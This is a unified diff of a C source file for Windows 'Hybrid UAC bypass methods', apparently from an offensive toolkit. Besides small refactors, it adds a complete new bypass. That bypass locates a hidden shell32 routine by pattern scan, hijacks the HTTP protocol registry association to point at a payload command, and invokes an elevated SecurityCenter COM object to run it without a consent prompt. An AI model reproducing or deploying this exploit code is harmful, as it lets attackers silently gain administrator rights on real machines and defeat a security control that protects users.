@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.51
+*  VERSION:     3.52
 *
-*  DATE:        16 Oct 2020
+*  DATE:        29 Oct 2020
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1111,8 +1111,7 @@ NTSTATUS ucmCorProfilerMethod(
             if (lResult == ERROR_SUCCESS) {
 
                 sz = (1 + _strlen(szBuffer)) * sizeof(WCHAR);
-                lResult = RegSetValueEx(
-                    hKey,
+                lResult = RegSetValueEx(hKey,
                     TEXT(""),
                     0,
                     REG_SZ,
@@ -1121,11 +1120,9 @@ NTSTATUS ucmCorProfilerMethod(
 
                 if (lResult == ERROR_SUCCESS) {
 
-                    RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
                     _strcpy(szRegBuffer, T_APARTMENT);
                     sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
-                    RegSetValueEx(
-                        hKey,
+                    RegSetValueEx(hKey,
                         T_THREADINGMODEL,
                         0,
                         REG_SZ,
@@ -1619,7 +1616,7 @@ NTSTATUS ucmIeAddOnInstallMethod(
 
     HANDLE processHandle = NULL;
 
-    BSTR workdirBstr;
+    BSTR workdirBstr, emptyBstr;
 
     WCHAR szDummyTarget[MAX_PATH * 2];
 
@@ -1761,15 +1758,21 @@ NTSTATUS ucmIeAddOnInstallMethod(
         workdirBstr = SysAllocString(g_ctx->szTempDirectory);
         if (workdirBstr) {
 
-            r = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker,
-                adminInstallerUuid,
-                NULL,
-                cacheItemFilePath,
-                TEXT(""),
-                workdirBstr,
-                TEXT(""),
-                4, //RSC_FLAG_QUIET
-                &processHandle); //there is always no process handle on output, ignore.
+            emptyBstr = SysAllocString(TEXT(""));
+            if (emptyBstr) {
+
+                r = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker,
+                    adminInstallerUuid,
+                    NULL,
+                    cacheItemFilePath,
+                    emptyBstr,
+                    workdirBstr,
+                    emptyBstr,
+                    4, //RSC_FLAG_QUIET
+                    &processHandle); //there is always no process handle on output, ignore.
+
+                SysFreeString(emptyBstr);
+            }
 
             SysFreeString(workdirBstr);
 
@@ -1806,6 +1809,368 @@ NTSTATUS ucmIeAddOnInstallMethod(
 
     if (lpPayloadFile)
         supHeapFree(lpPayloadFile);
+
+    if (hr_init == S_OK)
+        CoUninitialize();
+
+    return MethodResult;
+}
+
+/*
+* ucmxWscRegisterAssoc
+*
+* Purpose:
+*
+* Install/Remove/Register shell protocol.
+*
+*/
+NTSTATUS ucmxWscRegisterAssoc(
+    _In_ LPOLESTR ProtoGuid,
+    _In_ USER_ASSOC_PTR* UserAssocFunc,
+    _In_opt_ LPWSTR lpszPayload,
+    _In_ BOOL fRemove
+)
+{
+    HANDLE classesKey = NULL, assocKey = NULL;
+    NTSTATUS ntStatus;
+    SIZE_T sz;
+
+    HRESULT hr = E_FAIL;
+
+    WCHAR szBuffer[MAX_PATH];
+
+    if (UserAssocFunc == NULL)
+        return STATUS_INVALID_PARAMETER_2;
+
+    ntStatus = supOpenClassesKey(NULL, &classesKey);
+    if (!NT_SUCCESS(ntStatus))
+        return ntStatus;
+
+    _strcpy(szBuffer, ProtoGuid);
+
+    //
+    // Remove mode: delete protocol entry and leave.
+    //
+    if (fRemove) {
+
+        switch (g_ctx->dwBuildNumber) {
+        case 18362:
+        case 18363:
+
+            hr = UserAssocFunc->UserAssocSet2(UASET_CLEAR,
+                T_PROTO_HTTP,
+                NULL,
+                0);
+
+            break;
+        default:
+
+            hr = UserAssocFunc->UserAssocSet(UASET_CLEAR,
+                T_PROTO_HTTP,
+                NULL);
+
+            break;
+        }
+
+        supRegDeleteKeyRecursive(classesKey, szBuffer);
+        NtClose(classesKey);
+        return STATUS_SUCCESS;
+    }
+
+    if (lpszPayload == NULL)
+        return STATUS_INVALID_PARAMETER_3;
+
+    //
+    // Set mode: create protocol registry entry.
+    //
+    _strcat(szBuffer, T_SHELL_OPEN);
+    _strcat(szBuffer, TEXT("\\"));
+    _strcat(szBuffer, T_SHELL_COMMAND);
+
+    if (ERROR_SUCCESS == RegCreateKeyEx(classesKey,
+        szBuffer,
+        0,
+        NULL,
+        REG_OPTION_NON_VOLATILE,
+        MAXIMUM_ALLOWED,
+        NULL,
+        (HKEY*)&assocKey,
+        NULL))
+    {
+
+        sz = (_strlen(lpszPayload) + 1) * sizeof(WCHAR);
+
+        if (ERROR_SUCCESS == RegSetValueEx(assocKey,
+            TEXT(""),
+            0,
+            REG_SZ,
+            (BYTE*)lpszPayload,
+            (DWORD)sz))
+        {
+            ntStatus = STATUS_SUCCESS;
+        }
+        else {
+            ntStatus = STATUS_REGISTRY_IO_FAILED;
+        }
+    }
+    else {
+        ntStatus = STATUS_REGISTRY_IO_FAILED;
+    }
+
+    NtClose(classesKey);
+
+    if (!NT_SUCCESS(ntStatus))
+        return ntStatus;
+
+    ntStatus = STATUS_UNSUCCESSFUL;
+
+    //
+    // Set mode: register protocol within the shell.
+    //
+    if (g_ctx->dwBuildNumber > 19042) {
+
+        hr = UserAssocFunc->UserAssocSet2(UASET_PROGID,
+            T_PROTO_HTTP,
+            ProtoGuid,
+            2);
+
+    }
+    else {
+
+        switch (g_ctx->dwBuildNumber) {
+        case 18362:
+        case 18363:
+        case 17763:
+
+            hr = UserAssocFunc->UserAssocSet2(UASET_PROGID,
+                T_PROTO_HTTP,
+                ProtoGuid,
+                2);
+
+            break;
+
+        default:
+
+            hr = UserAssocFunc->UserAssocSet(UASET_PROGID,
+                T_PROTO_HTTP,
+                ProtoGuid);
+
+            break;
+        }
+
+    }
+
+#ifdef _DEBUG
+    _strcpy(szBuffer, TEXT("UserAssocSet 0x"));
+    ultohex(hr, _strend(szBuffer));
+    ucmShowMessage(FALSE, szBuffer);
+#endif
+
+    if (SUCCEEDED(hr))
+        ntStatus = STATUS_SUCCESS;
+
+    return ntStatus;
+}
+
+/*
+* ucmWscActionFindInternalRoutine
+*
+* Purpose:
+*
+* Locate internal shell routine.
+*
+*/
+NTSTATUS ucmWscActionFindInternalRoutine(
+    _Out_ USER_ASSOC_PTR* Function
+)
+{
+    HANDLE  hModule;
+
+    PBYTE  ptrCode;
+    PVOID  sectionBase, patternPtr, funcPtr;
+    ULONG  sectionSize = 0, patternSize;
+    LONG   rel = 0;
+    hde64s hs;
+    WCHAR  szBuffer[MAX_PATH * 2];
+
+    Function->UserAssocSet = NULL;
+    Function->Valid = FALSE;
+
+    switch (g_ctx->dwBuildNumber) {
+    case 7601:
+        patternPtr = UserAssocSet_7601;
+        patternSize = sizeof(UserAssocSet_7601);
+        break;
+    case 9600:
+        patternPtr = UserAssocSet_9600;
+        patternSize = sizeof(UserAssocSet_9600);
+        break;
+    case 14393:
+        patternPtr = UserAssocSet_14393;
+        patternSize = sizeof(UserAssocSet_14393);
+        break;
+    case 17763:
+        patternPtr = UserAssocSet_17763;
+        patternSize = sizeof(UserAssocSet_17763);
+        break;
+    case 18362:
+        patternPtr = UserAssocSet_18362;
+        patternSize = sizeof(UserAssocSet_18362);
+        break;
+    case 18363:
+        patternPtr = UserAssocSet_18363;
+        patternSize = sizeof(UserAssocSet_18363);
+        break;
+    case 19041:
+        patternPtr = UserAssocSet_19041;
+        patternSize = sizeof(UserAssocSet_19041);
+        break;
+    case 19042:
+        patternPtr = UserAssocSet_19042;
+        patternSize = sizeof(UserAssocSet_19042);
+        break;
+    default:
+        if (g_ctx->dwBuildNumber > 19042) {
+            patternPtr = UserAssocSet_vNext;
+            patternSize = sizeof(UserAssocSet_vNext);
+            break;
+        }
+        return STATUS_NOT_SUPPORTED;
+    }
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+    _strcat(szBuffer, SHELL32_DLL);
+
+    hModule = (HANDLE)LoadLibraryEx(szBuffer, NULL, 0);
+    if (hModule == NULL)
+        return STATUS_DLL_NOT_FOUND;
+
+    sectionBase = supLookupImageSectionByName(TEXT_SECTION,
+        TEXT_SECTION_LEGNTH,
+        (PVOID)hModule,
+        &sectionSize);
+
+    if (sectionBase == NULL || sectionSize == 0)
+        return STATUS_INVALID_ADDRESS;
+
+    ptrCode = (PBYTE)supFindPattern(sectionBase, sectionSize, patternPtr, patternSize);
+    if (ptrCode == NULL)
+        return STATUS_NOT_FOUND;
+
+    ptrCode = (PBYTE)RtlOffsetToPointer(ptrCode, patternSize);
+
+    hde64_disasm(ptrCode, &hs);
+    if (hs.flags & F_ERROR)
+        return STATUS_INTERNAL_ERROR;
+
+    if ((hs.len != 5) || (ptrCode[0] != 0xE8)) //call sus
+        return STATUS_BAD_DATA;
+
+    rel = *(PLONG)(ptrCode + 1);
+
+    funcPtr = ptrCode + hs.len + rel;
+
+    if (IN_REGION(funcPtr, sectionBase, sectionSize)) {
+        Function->UserAssocSet = (pfnUserAssocSet)funcPtr;
+        Function->Valid = TRUE;
+        return STATUS_SUCCESS;
+    }
+    else {
+        return STATUS_CONFLICTING_ADDRESSES;
+    }
+}
+
+/*
+* ucmWscActionProtocolMethod
+*
+* Purpose:
+*
+* Bypass UAC by SecurityCenter COM object and HTTP protocol registry hijack.
+* Original author link: https://github.com/AzAgarampur/byeintegrity3-uac
+*
+*/
+NTSTATUS ucmWscActionProtocolMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HRESULT  r = E_FAIL, hr_init;
+    IWscAdmin* WscAdminObject = NULL;
+
+    LPOLESTR protoGuidString = NULL;
+    USER_ASSOC_PTR SetUserAssoc;
+    GUID guid;
+
+#ifdef _DEBUG
+    WCHAR szDebug[0x100];
+#endif
+
+    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+    do {
+
+        if (CoCreateGuid(&guid) != S_OK)
+            break;
+
+        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
+            break;
+
+        MethodResult = ucmWscActionFindInternalRoutine(&SetUserAssoc);
+        if (!NT_SUCCESS(MethodResult)) {
+#ifdef _DEBUG
+            _strcpy(szDebug, L"ucmWscActionFindInternalRoutine FAIL 0x");
+            ultohex(MethodResult, _strend(szDebug));
+            ucmShowMessage(FALSE, szDebug);
+#endif
+            break;
+        }
+
+        MethodResult = ucmxWscRegisterAssoc(protoGuidString, &SetUserAssoc, lpszPayload, FALSE);
+        if (!NT_SUCCESS(MethodResult)) {
+#ifdef _DEBUG
+            _strcpy(szDebug, L"ucmxWscRegisterAssoc FAIL 0x");
+            ultohex(MethodResult, _strend(szDebug));
+            ucmShowMessage(FALSE, szDebug);
+#endif
+            break;
+        }
+        
+        MethodResult = STATUS_ACCESS_DENIED;
+
+        r = ucmAllocateElevatedObject(T_CLSID_SecurityCenter,
+            &IID_WscAdmin,
+            CLSCTX_LOCAL_SERVER,
+            &WscAdminObject);
+
+        if (FAILED(r))
+            break;
+
+        r = WscAdminObject->lpVtbl->Initialize(WscAdminObject);
+        if (FAILED(r))
+            break;
+
+        r = WscAdminObject->lpVtbl->DoModalSecurityAction(WscAdminObject, NULL, 103, NULL);
+
+        Sleep(1000);
+
+        if (SUCCEEDED(r))
+            MethodResult = STATUS_SUCCESS;
+
+    } while (FALSE);
+
+    //
+    // Cleanup.
+    //
+    if (WscAdminObject)
+        WscAdminObject->lpVtbl->Release(WscAdminObject);
+
+    if (protoGuidString) {
+        if (SetUserAssoc.Valid)
+            ucmxWscRegisterAssoc(protoGuidString, &SetUserAssoc, NULL, TRUE);
+        CoTaskMemFree(protoGuidString);
+    }
 
     if (hr_init == S_OK)
         CoUninitialize();
